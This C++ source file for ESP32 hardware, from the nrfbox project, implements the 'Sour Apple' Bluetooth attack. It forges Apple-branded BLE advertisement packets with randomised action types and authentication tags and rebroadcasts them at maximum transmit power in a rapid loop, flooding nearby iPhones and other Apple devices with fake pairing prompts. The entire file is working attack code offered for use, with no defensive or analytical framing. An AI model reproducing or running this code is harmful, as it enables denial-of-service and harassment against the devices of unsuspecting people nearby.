/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */
   
#include <Arduino.h> 
#include "sourapple.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

BLEAdvertising *Advertising;
uint8_t packet[17]; 

#define MAX_LINES 8  
String lines[MAX_LINES]; 
int currentLine = 0; 
int lineNumber = 1; 


void updatedisplay() {
  u8g2.clearBuffer(); 

  for (int i = 0; i < MAX_LINES; i++) {
    u8g2.setCursor(0, (i + 1) * 12); 
    u8g2.print(lines[i]); 
  }

  u8g2.sendBuffer(); 
}

void addLineToDisplay(String newLine) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    lines[i] = lines[i + 1];
  }
  lines[MAX_LINES - 1] = newLine;

  updatedisplay(); 
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + ": ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);
}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 16;          // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;        // Type
  packet[i++] = 0x05;        // Length
  packet[i++] = 0xC1;        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3);               // Authentication Tag
  i += 3;
  packet[i++] = 0x00;    // ???
  packet[i++] = 0x00;    // ???
  packet[i++] = 0x10;    // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup(){
  
  u8g2.begin();
  u8g2.clearBuffer(); 
  u8g2.setFont(u8g2_font_profont11_tf); 

  BLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();

  Advertising = pServer->getAdvertising();  
}

void sourappleLoop(){

  delay(40);
  BLEAdvertisementData advertisementData = getOAdvertisementData();
  Advertising->setAdvertisementData(advertisementData);
  Advertising->start();
  displayAdvertisementData(); 
  delay(20); 
  Advertising->stop();
  
}
